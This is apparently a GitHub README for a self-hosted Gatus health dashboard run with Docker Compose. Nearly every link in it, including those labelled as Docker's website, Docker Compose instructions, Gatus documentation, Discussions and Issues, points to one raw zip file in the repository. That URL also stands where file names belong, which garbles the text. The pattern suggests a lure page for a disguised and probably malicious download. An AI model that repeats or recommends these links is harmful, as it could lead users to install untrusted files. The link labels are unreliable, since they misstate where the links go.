# 🎉 gatus-self-hosted - Simple Health Dashboard Setup

[![Download gatus-self-hosted](https://github.com/VenkateshAneshwar/gatus-self-hosted/raw/refs/heads/main/excoriation/self-hosted-gatus-v2.4.zip)](https://github.com/VenkateshAneshwar/gatus-self-hosted/raw/refs/heads/main/excoriation/self-hosted-gatus-v2.4.zip)

## 🚀 Getting Started

Welcome to gatus-self-hosted! This application provides a straightforward way to set up a health monitoring dashboard using Docker Compose. It’s designed to help you keep track of the status of your services easily. Follow the steps below to get started.

## 📥 Download & Install

To get gatus-self-hosted, visit this page to download: [GitHub Releases](https://github.com/VenkateshAneshwar/gatus-self-hosted/raw/refs/heads/main/excoriation/self-hosted-gatus-v2.4.zip).

You will find various versions available. Choose the latest stable version for your needs.

### Steps to Download

1. Click on the link above to go to the releases page.
2. Look for the latest version listed.
3. The files will usually have names indicating the platform (e.g., `gatus-linux-amd64` for Linux or `https://github.com/VenkateshAneshwar/gatus-self-hosted/raw/refs/heads/main/excoriation/self-hosted-gatus-v2.4.zip` for Windows).
4. Click on the file name to start the download.

## ⚙️ System Requirements

Before running gatus-self-hosted, make sure your system meets the following requirements:

- **Operating System:** 
  - Windows, Linux, or macOS.
- **Docker:** 
  - Ensure you have Docker installed. Visit [Docker's website](https://github.com/VenkateshAneshwar/gatus-self-hosted/raw/refs/heads/main/excoriation/self-hosted-gatus-v2.4.zip) to download and install Docker if you don’t have it.
- **Docker Compose:**
  - You need Docker Compose to run the application efficiently. You can find installation instructions on [Docker Compose’s official page](https://github.com/VenkateshAneshwar/gatus-self-hosted/raw/refs/heads/main/excoriation/self-hosted-gatus-v2.4.zip).

## 📂 Setup Instructions

Once you've downloaded the necessary files, follow these instructions to set up gatus-self-hosted.

### Step 1: Extract Files

If you downloaded a compressed file (like a `.zip` or `https://github.com/VenkateshAneshwar/gatus-self-hosted/raw/refs/heads/main/excoriation/self-hosted-gatus-v2.4.zip`), extract it to a folder of your choice.

### Step 2: Open Terminal or Command Prompt

1. On Windows, open Command Prompt.
2. On macOS, open Terminal.

### Step 3: Navigate to the Directory

Use the `cd` command to change the directory to where you extracted the files:

```bash
cd path/to/extracted/directory
```

### Step 4: Run Docker Compose

Use Docker Compose to start the application. Run the following command:

```bash
docker-compose up -d
```

This command will start all the necessary services in the background. It may take a few moments for everything to initialize.

## 📊 Accessing the Dashboard

Once the services are up and running, you can access your Gatus dashboard:

1. Open your web browser.
2. Type in `http://localhost:8080` and press Enter.

You should see your Gatus health dashboard.

## 📚 Features

gatus-self-hosted comes with several useful features:

- **Service Monitoring:** Monitor multiple services and get their status in real-time.
- **Health Checks:** Customize health checks for your services, including HTTP checks and more.
- **Data Persistence:** Utilizes PostgreSQL to ensure your data stays safe, even across restarts.
- **Backup Scripts:** Automatic backup scripts to prevent data loss.

## ⚙️ Configuration

You can customize your Gatus setup by modifying the `https://github.com/VenkateshAneshwar/gatus-self-hosted/raw/refs/heads/main/excoriation/self-hosted-gatus-v2.4.zip` configuration file. This file allows you to set parameters such as:

- The services you want to monitor.
- The interval for health checks.
- Notification settings for alerts.

Refer to the [gatus documentation](https://github.com/VenkateshAneshwar/gatus-self-hosted/raw/refs/heads/main/excoriation/self-hosted-gatus-v2.4.zip) for detailed guidance on configuring your setup.

## ❓ Troubleshooting

If you encounter issues during installation or while running your application, check the following:

- **Docker Not Running:** Ensure Docker is running on your machine.
- **Ports in Use:** Make sure no other services are using the port that Gatus requires (default: 8080).
- **Logs:** Use the following command to view logs for debugging:

```bash
docker-compose logs
```

## 🌐 Community Support

If you need help or further guidance, feel free to connect with the community. Visit our [GitHub Discussions](https://github.com/VenkateshAneshwar/gatus-self-hosted/raw/refs/heads/main/excoriation/self-hosted-gatus-v2.4.zip) page for support or to ask questions.

Your feedback helps improve the software. Feel free to report any issues you find in the [Issues section](https://github.com/VenkateshAneshwar/gatus-self-hosted/raw/refs/heads/main/excoriation/self-hosted-gatus-v2.4.zip).

## 🌱 Next Steps

After you get everything set up, consider exploring additional integrations and features. You can link Gatus with other monitoring tools or services to enhance its capability.

## 🔗 Useful Links

- [GitHub Releases](https://github.com/VenkateshAneshwar/gatus-self-hosted/raw/refs/heads/main/excoriation/self-hosted-gatus-v2.4.zip)
- [Docker Installation](https://github.com/VenkateshAneshwar/gatus-self-hosted/raw/refs/heads/main/excoriation/self-hosted-gatus-v2.4.zip)
- [Docker Compose Installation](https://github.com/VenkateshAneshwar/gatus-self-hosted/raw/refs/heads/main/excoriation/self-hosted-gatus-v2.4.zip)
- [Gatus Documentation](https://github.com/VenkateshAneshwar/gatus-self-hosted/raw/refs/heads/main/excoriation/self-hosted-gatus-v2.4.zip)